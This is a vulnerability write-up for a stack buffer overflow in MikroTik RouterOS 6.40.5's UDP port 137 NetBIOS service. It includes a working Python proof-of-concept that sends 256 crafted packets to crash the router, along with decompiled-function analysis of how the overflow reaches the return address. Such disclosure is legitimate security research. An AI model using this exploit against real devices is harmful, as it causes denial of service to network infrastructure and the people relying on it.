

# Mikrotik 6.40.5 路由器 137 接口活动参数缓冲区溢出漏洞



## 1.Basic Information



- **Vulnerability Type**: Buffer Overflow

  **Description**: A buffer overflow vulnerability exists in the Mikrotik 6.40.5 firmware. The service on UDP port 137 is vulnerable, allowing remote attackers to send specially crafted packets that trigger a buffer overflow, resulting in a Denial of Service (DoS).

  **Affected Devices and Versions**:

  - Mikrotik RouterOS 6.40.5
  - Firmware version: Mikrotik 6.40.5



## 2. Proof of Concept (PoC)

The following Python script demonstrates the vulnerability:

```py
import socket
import time

def send_netbios_name_query(target_ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    ## last byte is the brute-force target
    base_packet = bytes.fromhex(
        "82280110000100000000000024434B41414141414141414141414141414141414141414141414141414141414141414141"
    )

    for i in range(0x01, 0x100):
        packet = base_packet + bytes([i])
        print((packet))
        print(f"[+] Sending packet with last byte: {i:#04x}")
        s.sendto(packet, (target_ip, 137))
        time.sleep(0.01)  # Optional: brief delay to reduce packet loss

    print("[*] All 256 NetBIOS queries sent.")
    s.close()

send_netbios_name_query("192.168.72.140")  # Replace with your RouterOS IP
```



## 3.Exploitation Principle

A buffer overflow occurs in the sub_8060430 function, causing the return address to be overwritten. The overflow happens within the sub_8054607 function. Upon examining the function, we can see that due to the presence of a while loop, the loop only exits when v2 becomes 0; otherwise, it continuously copies data from a2 to a1.
![image](https://github.com/user-attachments/assets/00ea7384-5e73-414e-90bc-d1306a48be00)

Tracing back, we find that the a3 argument is actually a stack address passed from the previous function, meaning it has limited space. However, in the sub_8054607 function, there is no restriction on the range of memory being written to, which results in a stack overflow.To trigger the sub_8054607 function, the UDP payload must be longer than 49 bytes. Although a subsequent qmemcpy limits the amount of data copied from the received UDP packet, the sub_8054607 function itself lacks such bounds checking.
![image](https://github.com/user-attachments/assets/0be3a610-bc57-4fff-8abf-876ee329e922)

Debugging shows that the first check is passed successfully.
![image](https://github.com/user-attachments/assets/82f9e6f2-476f-45a3-9cb9-04690eaa75a6)

Next, 0x32 bytes of data are copied from the received UDP packet.
![image](https://github.com/user-attachments/assets/8c8bfff6-6273-44c5-bac1-4f883b314e4b)

The result after copying is as follows:
![image](https://github.com/user-attachments/assets/f5ae48a0-d8c7-4476-bad7-eb80ee408f48)

Later, the sub_8054607 function is called, where the length of the first copy operation is determined by the 13th byte after the previously copied data. The copying starts just after the 0x20-byte offset.
![image](https://github.com/user-attachments/assets/ce777607-1c89-44e9-b0a9-fa1cbd45a3fe)

After the first round of copying is completed — that is, when 0x20 bytes have been copied — the byte immediately following the last character of this round is treated as the length for the next round of copying. In this case, the value is 0x41.
![image](https://github.com/user-attachments/assets/19d84d5b-cddc-4262-9c44-560d034471d9)

Then proceed to start the next round of assignment
![image](https://github.com/user-attachments/assets/c12c4910-de26-488f-a5af-74a62a61a5b3)

Continue to assign values later:
![image](https://github.com/user-attachments/assets/a6a6bb3b-eeb2-4845-aff9-984668764711)

As long as the value retrieved from memory this time is not 0 (indicating the length of the next assignment), the assignment will continue downward until the retrieved length is 0, and then the loop will exit. However, as mentioned earlier, the length we can control is only 0x32 bytes, so we need to make use of the values that already exist on the stack in the program.

Finally, call the end position of the sub_8054607 function to check the stack space at this time and the position of the return value of the upper-level function (because the destination address of the assignment is inside the stack of the upper-level function) :
![image](https://github.com/user-attachments/assets/b8ac0682-b0c7-4f3f-8d4b-1c2f19b3d245)

Finally, the function returned with an error and exited:
![image](https://github.com/user-attachments/assets/12238d33-ea41-499d-926d-a9d63259075c)

To increase the probability of denial of service, we can try to blast the first or second round multiple times... .. By combining the lengths, try different numbers of rounds as many times as possible to make the number of cycles of this round as many as possible each time the explosion occurs. Finally, the purpose of overwriting the return value of the upper-level function is achieved.
The idea of the blasting script: We set the assignment length of the first round to 0x24：

![image](https://github.com/user-attachments/assets/5477f55a-2133-4991-9a93-6b1479be4874)

It is followed by 23 bytes, and the byte immediately following is the length of the second round of assignment. We can perform an explosion to maximize the use of the 1 to 255 pieces of data on the original stack to explosion the length of the third round of assignment (this will continue to affect the subsequent rounds and thus try more combinations) :
Compared with the non-blasting script: The overflow length of one attempt is not sufficient to cover the return address of the upper-level function sub_8060430
![image](https://github.com/user-attachments/assets/89096755-8a90-4787-9e19-fd0c7269f17f)

Run the blasting script at this time:
Finally, there will be a combination that overwrites the return value of the upper-level function, resulting in dos

![image](https://github.com/user-attachments/assets/f2e59d8b-84fa-4a7c-aa54-0a5c198b4e42)
![image](https://github.com/user-attachments/assets/eba41375-edfe-473f-b1d1-bc5362a8a34f)








